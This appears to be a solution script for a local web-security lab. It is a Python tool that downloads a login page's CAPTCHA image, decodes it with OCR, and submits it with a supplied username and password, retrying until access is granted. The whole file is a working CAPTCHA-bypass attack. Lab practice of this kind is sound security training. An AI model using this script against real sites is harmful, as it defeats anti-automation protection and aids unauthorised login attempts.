#!/usr/bin/python3

import requests, time, os, re, signal, pytesseract, colorama, sys
from colorama import Fore
from PIL import Image

def def_handler(sig, frame):
    print("\n\n[!] Exiting...")
    sys.exit(1)

def GetCaptcha(base_url, username, password):
    for i in range(10):
        try:
            # Create a session for multiple requests
            s = requests.session()

            print(Fore.MAGENTA + "[*]" + Fore.WHITE + " Obtaining captcha image url...")
            response = s.get(base_url) # Send request
            captcha_expression = re.search(r'\d{5,10}', response.text) # Use regex to filter for captcha rand url number
            image_url = base_url.removesuffix("lab2.php") + "captcha.php?rand=" + captcha_expression.group(0) # Build captcha image url

            print(image_url)
            print(Fore.GREEN + "[+]" + Fore.WHITE + " Image url: " + image_url)
            captcha_image = s.get(image_url) # Send request to image

            # Save captcha image in a file
            f = open("captcha.jpg", "wb")
            f.write(captcha_image.content)
            f.close()
            time.sleep(0.2)

            print(Fore.MAGENTA + "[*]" + Fore.WHITE + " Converting captcha image to text...")
            # Use pytesseract to parse image
            captcha_value = pytesseract.image_to_string(Image.open('captcha.jpg')).strip()
            os.remove("captcha.jpg")

            print(Fore.GREEN + "[+]" + Fore.WHITE + " Captcha value: %s" % captcha_value)
            time.sleep(0.2)

            print(Fore.MAGENTA + "[*]" + Fore.WHITE + " Checking if captcha is valid...")
            post_data = {
                'captcha': '%s' % (captcha_value),
                'username': username,
                'password': password,
                'submit': 'Submit'
            }

            r2 = s.post(base_url, data=post_data)

            if "Access Granted" in r2.text:
                print(Fore.GREEN + "\n[+]" + Fore.WHITE + " Login successful!")
                break
            elif "Submitted captcha" in r2.text:
                print(Fore.RED + "\n[-]" + Fore.WHITE + " Invalid captcha\n")
            else:
                print(Fore.RED + "\n[-]" + Fore.WHITE + " Login failed\n")
                break
        except Exception as e:
            print(e)
            sys.exit(1)

if __name__ == '__main__':
    if len(sys.argv) >= 4:
        base_url = sys.argv[1]
        username = sys.argv[2]
        password = sys.argv[3]

        GetCaptcha(base_url, username, password)
    else:
        print("Usage: python3 solution2.py http://127.0.0.1/lab2.php username password")
        sys.exit(0)

